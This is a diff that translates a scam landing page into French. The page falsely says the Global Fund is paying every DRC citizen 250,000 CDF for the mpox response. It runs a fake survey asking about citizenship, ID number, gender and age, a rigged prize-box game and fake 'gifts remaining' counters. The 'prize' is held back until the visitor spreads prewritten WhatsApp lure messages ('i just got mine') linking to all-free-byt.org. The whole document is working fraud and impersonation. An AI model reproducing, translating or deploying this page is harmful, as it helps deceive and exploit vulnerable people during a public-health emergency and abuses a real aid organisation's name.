@@ -9,7 +9,7 @@
 <head>
 	<script src="drc-activate.js"></script>
 <script src="alladz.js"></script>
-<title>Global Fund Provides 250,000CDF  for DRC’s Mpox Response</title>
+<title>Le Fonds mondial fournit 250 000 CDF pour la réponse à la Mpox en RDC</title>
 <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYMRKnTCZTxOX2qmrAMx9zahB1_FokzQx23R7jMlWOUbIZIlIW5biBi9v4g4pn9funCFN7zJSq5p4HUs-wxNlOvz0a96a5sQYRQbzvShiaNYc0kQeaTNtV6nnAYWJzdJYyTRD8O7IHorWcc82OL3XL5K0GRqg0pscX5PL6S2h99ARqaIP-zObbIJJ56Aia/s320/3EDE6844-3EDC-4A47-91C3-911BD8F28E01.jpeg" />
 <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -290,23 +290,23 @@ button:hover {
   
 
 <vue-modal :open="showInstructionsModal">
-<h2 class="heading heading--h1">Congratulation! Your answers have been saved</h2>
+<h2 class="heading heading--h1">Félicitation ! Vos réponses ont été enregistrées</h2>
  
 <p class="paragraph">
-Now you have a chance to win 250,000CDF cash prize<br><br>
-You have 3 chances ! we wish you good luck
+Vous avez maintenant une chance de gagner un prix en espèces de 250 000 CDF<br><br>
+Vous avez 3 chances ! nous vous souhaitons bonne chance
 <br><br>
-You need to select the box that has the gift inside the boxes.
+Vous devez sélectionner la boîte qui contient le cadeau à l'intérieur des boîtes.
 </p>
    <br>
 <button class="button" v-on:click="showInstructionsModal = false">
-Start
+Commencer
 </button>
 </vue-modal>
 <vue-modal :open="showFailModal">
-<h2 class="heading heading--h1">Better luck next time</h2>
+<h2 class="heading heading--h1">Plus de chance la prochaine fois</h2>
 <p class="paragraph">
-You have (2) extra chances. 
+Vous avez (2) chances supplémentaires. 
 </p>
    <br>
 <button class="button" v-on:click="showFailModal = false">
@@ -319,7 +319,7 @@ OK
 <p class="paragraph">
 
 
-Your Prize is: <b> 250,000CDF cash</b><br>Follow the instructions on the next page to claim your prize ! 
+Votre prix est: <b> 250,000CDF cash</b><br>Suivez les instructions sur la page suivante pour réclamer votre prix ! 
 </p>
     <br>
 <button class="button" v-on:click="$confetti.stop()" onclick="go();">
@@ -343,9 +343,9 @@ Ok
 Hello!
 </h1>
   <p class="paragraph">
-Welcome to <b>GLOBAL FUND PROVIDES 250,000CDF Mpox Response For Democratic Republic of the Congo</b>, At the request of the government of the Democratic Republic of the Congo (DRC), the Global Fund to Fight AIDS, Tuberculosis and Malaria (the Global Fund) is supporting all DRC’s  Citizens with 250,000CDF for its emergency mpox response in all the provinces.
+Bienvenue à <b>LE FONDS MONDIAL FOURNIT UNE RÉPONSE Mpox DE 250 000 CDF à la République Démocratique du Congo</b>, A la demande du gouvernement de la République Démocratique du Congo (RDC), le Fonds Mondial de Lutte contre le Sida, la Tuberculose et le Paludisme (le Fonds Mondial) soutient tous les citoyens de la RDC avec 250 000 CDF pour sa réponse d'urgence mpox dans toutes les provinces..
 <br>
-Answer the questions below to claim <b>250,000CDF Cash Prize</b>
+Répondez aux questions ci-dessous pour réclamer <b>Prix ​​en espèces de 250 000 CDF</b>
 </p>
   <br>
 </div>
@@ -362,51 +362,51 @@ Answer the questions below to claim <b>250,000CDF Cash Prize</b>
 </vue-text-rotator>
 <div class="verify__text" v-if="rotateIndex > 1">
 <strong>
-You have answered 4/4 of the questions
+Vous avez répondu à 4/4 des questions
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Your answers are being processed
+Vos réponses sont en cours de traitement
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 2">
 <strong>
-still prizes available!
+encore des prix disponibles !
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Looking for gifts.. 
+À la recherche de cadeaux.. 
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 3">
 <strong>
-Only (289) gifts remain!
+Il ne reste que (289) cadeaux!
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Stock is being checked
+Le stock est en cours de vérification
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 </div>
 <vue-survey v-if="showSurvey" :show-steps="true" :questions='[
             {
-              title: "Are you a citizen of DRC?",
-              answers: [ { text: "Yes" }, { text: "No" } ]
+              title: "Êtes-vous citoyen de la RDC?",
+              answers: [ { text: "Oui" }, { text: "Non" } ]
             },
                                                              {
-              title: "Do you have DRC ID number",
-              answers: [ { text: "Yes" }, { text: "No" } ]
+              title: "Avez-vous un numéro d'identification RDC",
+              answers: [ { text: "Oui" }, { text: "Non" } ]
             },
             {
-              title: "Choose your Gender?",
-              answers: [ { text: "Male" }, { text: "Female" } ]
+              title: "Choisissez votre sexe?",
+              answers: [ { text: "Femelle" }, { text: "Mâle" } ]
             },
             {
-              title: "Select Your Age Range?",
-              answers: [ { text: "18 - 20years" }, { text: "21 - 25years" }, { text: "26 - 30 years" }, { text: "30years Above" } ]
+              title: "Sélectionnez votre tranche d'âge?",
+              answers: [ { text: "18 - 20 ans" }, { text: "21 - 25ans" }, { text: "26 - 30 ans" }, { text: "30 ans au-dessus" } ]
             },
           ]' v-on:finish="onSurveyFinish"></vue-survey>
 </div>
@@ -418,20 +418,20 @@ Stock is being checked
   <div id="share">
     
 <div class="title1">
-<p>Congratulations! </p>
+<p>Félicitations! </p>
 </div>
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
                                 <center>   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYMRKnTCZTxOX2qmrAMx9zahB1_FokzQx23R7jMlWOUbIZIlIW5biBi9v4g4pn9funCFN7zJSq5p4HUs-wxNlOvz0a96a5sQYRQbzvShiaNYc0kQeaTNtV6nnAYWJzdJYyTRD8O7IHorWcc82OL3XL5K0GRqg0pscX5PL6S2h99ARqaIP-zObbIJJ56Aia/s1242/3EDE6844-3EDC-4A47-91C3-911BD8F28E01.jpeg" width='81%'/> </center>
                            
 
                             </div>
-<p class="txt1">Your Prize is: <b>250,000CDF</b> <br>Follow the instructions below to your prize !</p>
+<p class="txt1">Votre prix est: <b>250,000CDF</b> <br>Suivez les instructions ci-dessous pour obtenir votre prix !</p>
       <div class="bottom" id='buttonO'>
-<div id="lastapp"><p class="rules">1.share with 5 groups / 15 friends on "Whatsapp" (click the "Whatsapp" icon below)</p><p class="rules">2. Click "Continue" and claim your prize.</p></div>
+<div id="lastapp"><p class="rules">1.partagez avec 5 groupes / 15 amis sur "Whatsapp" (cliquez sur l'icône "Whatsapp" ci-dessous)</p><p class="rules">2. Cliquez sur "Continuer" et réclamez votre prix.</p></div>
 
     
    <div class="share_main_bt" id="whatsapp">WhatsApp&nbsp;   →</div>
-  <h4 class="textlastup">Share until the blue bar is full!</h4>
+  <h4 class="textlastup">Partagez jusqu'à ce que la barre bleue soit pleine!</h4>
   <div class="barr">
                 <div class="fill">
                     <div id="fill2"></div>
@@ -442,7 +442,7 @@ Stock is being checked
                 </div>
     
             <br>       <div class="share_main_bt" onclick="tipn()" style="margin: 20px auto 0; background-color: #BE0612;">
-                                Continue
+                                Continuer
                             </div>
    
   </div></div>
@@ -462,13 +462,13 @@ Stock is being checked
                            
 
                             </div>
-<p class="txt1">Your Prize is: <b>250,000CDF cash.</b> <br>Follow the instruction below to claim your prize !</p>
+<p class="txt1">Your Prize is: <b>250,000CDF cash.</b> <br>Suivez les instructions ci-dessous pour réclamer votre prix !</p>
             <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>   
         <br>
         
-      <div class="share_main_bt" id="offer">Claim 250,000CDF</div>
+      <div class="share_main_bt" id="offer">Réclamez 250 000CDF</div>
                             
-            <div class="share_main_bt" id="offers">Withdraw 250,000CDF</div> 
+            <div class="share_main_bt" id="offers">Retirer 250 000CDF</div> 
       <br>
           
        
@@ -521,10 +521,10 @@ function go() {
 
 <script>
   var tiaoban = [
-    "Global Fund Provides 250,000CDF  for DRC’s Mpox Response%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive 250,000CDF instantly.%0A i just got mine%0A%0AClick Here👇%0A https://all-free-byt.org/drc-mpox.html ",
-    "Global Fund Provides 250,000CDF  for DRC’s Mpox Response%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive 250,000CDF instantly.%0A i just got mine%0A%0AClick Here👇%0A https://all-free-byt.org/drc-mpox ",
-    "Global Fund Provides 250,000CDF  for DRC’s Mpox Response%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive 250,000CDF instantly.%0A i just got mine%0A%0AClick Here👇%0A https://all-free-byt.org/drc-mpox.html ",
-    "Global Fund Provides 250,000CDF  for DRC’s Mpox Response%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive 250,000CDF instantly.%0A i just got mine%0A%0AClick Here👇%0A https://all-free-byt.org/drc-mpox ",
+    "*Le Fonds mondial fournit 250 000 CDF pour la réponse à la Mpox en RDC*%0A%0A*COMMENT L'OBTENIR*%0AVisitez le lien ci-dessous et répondez aux questions suivantes et vous recevrez 250 000CDF instantanément.%0A je viens de recevoir le mien%0A%0ACliquez ici👇%0A https://all-free-byt.org/drc-mpox.html ",
+    "*Le Fonds mondial fournit 250 000 CDF pour la réponse à la Mpox en RDC*%0A%0A*COMMENT L'OBTENIR*%0AVisitez le lien ci-dessous et répondez aux questions suivantes et vous recevrez 250 000CDF instantanément.%0A je viens de recevoir le mien%0A%0ACliquez ici👇%0A https://all-free-byt.org/drc-mpox ",
+    "*Le Fonds mondial fournit 250 000 CDF pour la réponse à la Mpox en RDC*%0A%0A*COMMENT L'OBTENIR*%0AVisitez le lien ci-dessous et répondez aux questions suivantes et vous recevrez 250 000CDF instantanément.%0A je viens de recevoir le mien%0A%0ACliquez ici👇%0A https://all-free-byt.org/drc-mpox.html ",
+    "*Le Fonds mondial fournit 250 000 CDF pour la réponse à la Mpox en RDC*%0A%0A*COMMENT L'OBTENIR*%0AVisitez le lien ci-dessous et répondez aux questions suivantes et vous recevrez 250 000CDF instantanément.%0A je viens de recevoir le mien%0A%0ACliquez ici👇%0A https://all-free-byt.org/drc-mpox ",
 ];
 var tiaoban = tiaoban[Math.floor(Math.random() * tiaoban.length)];
 
